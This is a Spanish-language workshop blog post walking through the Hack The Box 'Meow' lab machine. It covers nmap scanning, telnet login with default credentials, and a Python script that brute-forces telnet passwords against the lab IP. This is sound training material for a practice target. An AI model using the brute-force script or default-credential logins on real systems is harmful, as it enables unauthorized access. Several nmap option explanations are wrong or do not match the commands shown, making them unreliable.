---
layout: post
author: Isui Martinez
title: Introduction to Ethical Hacking using Hack the Box
---
![](/images/taller_hacking/TALLER_INTRODUCCION_HACKING.png)
#### DISCLAIMER / DESLINDE DE RESPONSABILIDAD
El presente taller tiene como objetivo proporcionar información y conocimientos relacionados con la ciberseguridad y el hacking ético. Los materiales, ejemplos y ejercicios ofrecidos en este taller están destinados exclusivamente a fines educativos y formativos. El uso indebido de la información o las técnicas presentadas en este taller para actividades ilegales o maliciosas es estrictamente prohibido y desalentado. La institución, organizadores, e instructores de este taller no se hacen responsables de cualquier uso inapropiado o ilegal que los participantes puedan hacer de la información o las habilidades adquiridas durante el taller. Al asistir y participar en este taller, los participantes aceptan plenamente este descargo de responsabilidad y se comprometen a utilizar sus conocimientos de manera ética y legal.

# RECURSOS:
* [Slides](/documents/taller_hacking_recursos/TALLER_INTRODUCCION_HACKING.pdf)
* [Reporte técnico Meow](/documents/taller_hacking_recursos/Mew_Technical_report.pdf)
* [Plantilla reporte técnico](/documents/taller_hacking_recursos/Mew_Technical_report.docx)


## CREAR CUENTA
La siguiente imagen muestra como crear una cuenta en HTB:  
![Tutotail](https://github.com/IsuiLugo/TallerHTB/blob/main/TUTORIAL%20CUENTA%20HTB.png?raw=true "tutorial")

## Máquina MEW
Práctica nivel INICIAL, lo primero es conectarse con la VPN de HTB, en el apartado de CONNECT TO HTB, en STARTING POINT:
![imagen](/images/taller_hacking/Pasted%20image%2020240418071230.png)  

luego en PWNBOX y clic en el botón START PWNBOX:  
![imagen](/images/taller_hacking/Pasted%20image%2020240418071352.png)

Tardara aproximadamente dos minutos en iniciar una instancia en el servicio cloud de HTB, una vez lo finalice de cargar pulsar clic en el botón OPEN DESKTOP, y abrirá una nueva pestaña con una instancia de PARROT SECURITY:  
![imagen](/images/taller_hacking/Pasted%20image%2020240418071549.png)  

Ahora en el apartado de Starting Point, la Máquina MEW tendrá ya habilitada la opción de: SPAWN MACHINE, pulsar clic, y esperara a que inicie el servicio de VPN.  
![imagen](/images/taller_hacking/Pasted%20image%2020240418071750.png)

Una vez asignada una dirección IP, copiarla:   
![imagen](/images/taller_hacking/Pasted%20image%2020240418071932.png)
Está dirección IP, cambia en cada cuenta.  

### Reconocimiento:
Crear un directorio en el escritorio de nuestra instancia de analisista:
```
cd Desktop/
mkdir maquinas
cd maquinas
mkdir meow
```

Lo primero es enviar una trace-icmp desde la máquina del analisista, a la máquina objetivo mediante el comando:
```
ping -c 1 10.129.87.30
```

Entregara una respuesta de la máquina objetivo si esta ya se encuentra en el mismo segmento de red:
```
┌─[us-starting-point-1-dhcp]─[10.10.15.25]─[isulgm@htb-fjlytpfwta]─[~/Desktop/maquinas]
└──╼ [★]$ ping -c 1 10.129.87.30
PING 10.129.87.30 (10.129.87.30) 56(84) bytes of data.
64 bytes from 10.129.87.30: icmp_seq=1 ttl=63 time=8.35 ms

--- 10.129.87.30 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 8.350/8.350/8.350/0.000 ms
┌─[us-starting-point-1-dhcp]─[10.10.15.25]─[isulgm@htb-fjlytpfwta]─[~/Desktop/maquinas]
└──╼ [★]$ 

```

Por el apartado de TTL, se puede intuir que se trata de una posible Máquina con sistema operativo Linux.
### Escaneo
El escaneo consiste en revisar que servicios o puertos se ecuentran ejecutandose en el máquina objetivo, y si es posible vulnerarlos de alguna manera.

Se utilizara la herramienta NMAP:
```
sudo nmap --open -sSV -vvv --min-rate 5000 -n -Pn 10.129.87.30
```
1. `sudo`: El comando "sudo" se utiliza para ejecutar Nmap con privilegios de superusuario, lo que puede ser necesario para escanear ciertos puertos o realizar escaneos más avanzados.
2. `nmap`: Este es el comando que ejecuta la herramienta Nmap, que se utiliza para realizar escaneos de red y determinar qué puertos están abiertos en un dispositivo remoto.
3. `--open`: Este parámetro indica a Nmap que solo muestre los puertos que están abiertos en el dispositivo. De esta manera, se filtran los puertos cerrados y solo se muestran los activos.
4. `-sSV`: Estos son varios parámetros combinados:
    - `-sS`: Indica un escaneo TCP SYN, que es uno de los tipos de escaneo más comunes y discretos. Nmap enviará paquetes SYN al dispositivo objetivo.
    * `-V`: Aumenta la verbosidad del escaneo para obtener información detallada sobre los resultados.
5. `-vvv`: Este parámetro aumenta la verbosidad del escaneo, lo que significa que Nmap proporcionará una cantidad significativamente mayor de información detallada durante el escaneo.
6. `-n`: Este parámetro indica a Nmap que no realice la resolución de nombres DNS durante el escaneo. Esto puede acelerar el proceso al evitar la búsqueda de nombres de dominio para las direcciones IP encontradas.
7. `-Pn`: Este parámetro indica a Nmap que no realice la detección de hosts en la red. En otras palabras, no verificará si los dispositivos objetivo están vivos antes de escanearlos.
8. `192.168.93.136`: Esta es la dirección IP del dispositivo que se escaneará.
9. `-oG escaneo1`: Este parámetro indica a Nmap que genere la salida en un formato Greppable (Grepable) y la guarde en un archivo llamado "escaneo1". El formato Greppable es útil para analizar los resultados del escaneo con herramientas como Grep.

Mediante expresiones regulares, se extraeran los puertos reconocidos por el escaneo:
```
grep -oP '\d+/open/tcp/\S+' escaneo1 | cut -d '/' -f 1 | tr '\n' ',' | xclip -selection clipboard
```

Explicación del comando anterios con GREP:
1. **`grep -oP '\\d+/open/tcp/\\S+' escaneo1`**:
    - **`grep`** es una herramienta que se utiliza para buscar patrones en texto.
    - **`o`** le dice a **`grep`** que solo muestre las partes del texto que coinciden con el patrón en lugar de mostrar toda la línea.
    - **`P`** habilita el uso de expresiones regulares Perl, que nos permite definir patrones más complejos.
    - **`'\\d+/open/tcp/\\S+'`** es el patrón que estamos buscando. Aquí está desglosado:
        - **`\\d+`** coincide con uno o más dígitos (que representan el número de puerto).
        - **`/open/tcp/`** coincide con "/open/tcp/" literalmente en el texto.
        - **`\\S+`** coincide con uno o más caracteres no espaciados (que representan la descripción del servicio, como "ssh" o "http").
    
    Entonces, este comando busca y muestra las partes del texto en el archivo "allPorts" que coinciden con el patrón que representa los puertos abiertos.
    
2. **`cut -d '/' -f 1`**:
    
    - **`cut`** es una herramienta que se utiliza para dividir líneas de texto en campos y seleccionar campos específicos.
    - **`d '/'`** especifica que el delimitador entre campos es el carácter '/'.
    - **`f 1`** indica que queremos seleccionar el primer campo después de dividir la línea con '/'.
    
    En este paso, estamos tomando la salida del comando **`grep`** (que contiene líneas con números de puerto y descripciones de servicios) y usando **`cut`** para seleccionar solo el primer campo, que es el número de puerto. Esto nos da una lista de puertos abiertos.

Una vez obteniendo el número de puertos abiertos, se realizará un escaneo exhaustivo en cada uno:
```
sudo nmap -sCV -p23 10.129.87.30 -oN puertos
```

Nos muestra los posibles vectores de ataque:

```
┌─[us-starting-point-1-dhcp]─[10.10.15.25]─[isulgm@htb-fjlytpfwta]─[~/Desktop/maquinas]
└──╼ [★]$ sudo nmap -sCV -p23 10.129.87.30 -oN puertos
Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-18 14:41 BST
Nmap scan report for 10.129.87.30
Host is up (0.0081s latency).

PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.53 seconds
┌─[us-starting-point-1-dhcp]─[10.10.15.25]─[isulgm@htb-fjlytpfwta]─[~/Desktop/maquinas]
└──╼ [★]$ 

```

## Intrusión

Investigar las posibles vulnerabilidades de un servicio especifico, como el puerto 23, con Telnet.
> Lectura recomendada: https://www.hackingarticles.in/penetration-testing-telnet-port-23/

Lo primero es intentar conectarse sin ningún tipo de autenticación:
```
┌─[us-starting-point-1-dhcp]─[10.10.15.25]─[isulgm@htb-fjlytpfwta]─[~/Desktop/maquinas]
└──╼ [★]$ telnet 10.129.87.30
Trying 10.129.87.30...
Connected to 10.129.87.30.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: 

```

Se puede intentar con distintos tipos usuarios por ejemplo:
*  admin
* adminitrator
* main
* meow

Cuando se instala el servico de Telnet, en muchas ocaciones no es configurado correctamente, y se deja con las credenciales por defecto como:
* root
* toor
Se puede automatizar el ataque, por medio de Scripts, o herramientas como Metasploit, entre otras, un ejemplo puede ser automatizado con Python.

~~~ python:
        import socket
        import threading

        # Definición de la clase TelnetBrute
        class TelnetBrute:
            # Constructor de la clase TelnetBrute
            def __init__(self, ip='localhost', port=23):
                self.ip = ip  # Dirección IP del dispositivo Telnet
                self.port = port  # Puerto Telnet (por defecto es el 23)
                self.cracked = False  # Indica si se ha encontrado la contraseña correcta

            # Método para intentar establecer una conexión Telnet con el dispositivo objetivo
            def connect(self):
                try:
                    # Se intenta crear una conexión al dispositivo Telnet
                    sock = socket.create_connection((self.ip, self.port))
                    # Se recibe datos de la conexión (en este caso, un mensaje del servidor)
                    data = sock.recv(1024)
                    # Se cierra la conexión
                    sock.close()
                except Exception as e:
                    # Si ocurre algún error durante la conexión, se imprime el mensaje de error
                    print(e)

            # Método para intentar autenticarse en el dispositivo Telnet con una contraseña dada
            def try_password(self, password):
                try:
                    # Se intenta crear una conexión al dispositivo Telnet
                    sock = socket.create_connection((self.ip, self.port))
                    # Se envía el nombre de usuario al servidor
                    sock.send('username\n'.encode())
                    # Se recibe la respuesta del servidor
                    sock.recv(1024)
                    # Se envía la contraseña al servidor
                    sock.send(f'password:{password}\n'.encode())
                    # Se recibe la respuesta del servidor
                    data = sock.recv(1024)
                    # Se cierra la conexión
                    sock.close()

                    # Se comprueba si la contraseña fue incorrecta
                    if b'Incorrect password' in data:
                        return False  # Si la contraseña es incorrecta, se devuelve False
                    else:
                        self.cracked = True  # Si la contraseña es correcta, se marca como "cracked"
                        return True  # Se devuelve True
                except Exception as e:
                    # Si ocurre algún error durante la conexión, se imprime el mensaje de error
                    print(e)

            # Método para ejecutar el proceso de fuerza bruta
            def run(self, passwords):
                # Iterar sobre cada contraseña en la lista de contraseñas
                for password in passwords:
                    # Intentar autenticarse con la contraseña actual
                    success = self.try_password(password)
                    # Si la autenticación es exitosa, se detiene el bucle
                    if success:
                        break

        # Función para ejecutar el ataque de fuerza bruta
        def attack(target, passwords):
            # Crear una instancia de TelnetBrute para el objetivo actual
            brute = TelnetBrute(*target)
            # Ejecutar el proceso de fuerza bruta para la instancia de TelnetBrute
            brute.run(passwords)

        # Función principal del programa
        def main():
            # Lista de objetivos (direcciones IP) a atacar
            targets = [
                ('10.129.87.30', )
            ]
            # Lista de contraseñas a probar
            passwords = [
                'admin', 'administrator', 'mewo', 'root'
            ]  # Cambia esta lista según corresponda
            # Lista para almacenar los hilos de ejecución
            threads = []

            # Para cada objetivo en la lista de objetivos
            for target in targets:
                # Crear un hilo de ejecución para atacar el objetivo actual
                thread = threading.Thread(target=attack, args=(target, passwords))
                # Iniciar el hilo
                thread.start()
                # Agregar el hilo a la lista de hilos
                threads.append(thread)

            # Esperar a que todos los hilos terminen
            for thread in threads:
                thread.join()

        # Comprobar si el script se está ejecutando directamente
        if __name__ == '__main__':
            # Llamar a la función principal
            main()

~~~

Práctica 1 finalizada.

